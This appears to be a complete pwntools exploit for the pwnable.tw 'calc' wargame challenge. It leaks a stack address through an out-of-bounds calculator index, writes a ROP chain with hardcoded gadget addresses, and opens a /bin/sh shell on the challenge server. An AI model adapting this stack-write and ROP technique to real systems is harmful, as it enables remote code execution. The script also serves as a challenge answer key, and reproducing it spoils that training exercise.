from pwn import *

debug = False

if debug:
    s = process('./calc')
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(s)[0])
else:
    s = remote('chall.pwnable.tw',10100)

stack = [0x080550d0,0x0808f936,0x0,0x08065773,0x080701d0,0x0,0x0,0x0,0x08049a21,u32('/bin'),u32('/sh\0')]

def get_ebp():
    payload = '+' + str(360)
    s.send(payload+'\n')
    ebp = int(s.recv(1024))+0x100000000
    return ebp

def set_ebx():
    ebp = get_ebp()
    ebx = ebp+0x8
    print 'ebp is %x and set ebx with %x' % (ebp, ebx)
    stack[7] = ebx

def write_stack():
    for i in range(361,372):
        index = i-361
        payload = '+' + str(i)
        print '[*] - send : ' + payload
        s.send(payload+'\n')
        num = int(s.recv(1024))
        offset = stack[index] - num
        print '[*] offset is %x' % (offset)
        if offset < 0:
            payload_ = payload +'-' + str(-offset) + '\n'
        else:
            payload_ = payload + '+' + str(offset) + '\n'
        s.send(payload_)
        print '[*] set stack with sending: ' +payload_
        value = int(s.recv(1024))
        if value < 0:
            value += 0x100000000
        print 'recive %x and new stack is %x' % (value, stack[index])
        while value != stack[index]:
            offset = stack[index] - value
            if offset < 0:
                payload__ = payload + '-' + str(-offset) + '\n'
            else:
                payload__ = payload + '+' + str(offset) + '\n'
            s.send(payload__)
            print '[!] send again with ' + payload__
            value = int(s.recv(1024))
            if value<0:
                value += 0x100000000
            print 'recive %x and new stack is %x' % (value, stack[index])

    s.send('Bye!\n')


print s.recv(1024)
set_ebx()
write_stack()
s.interactive()
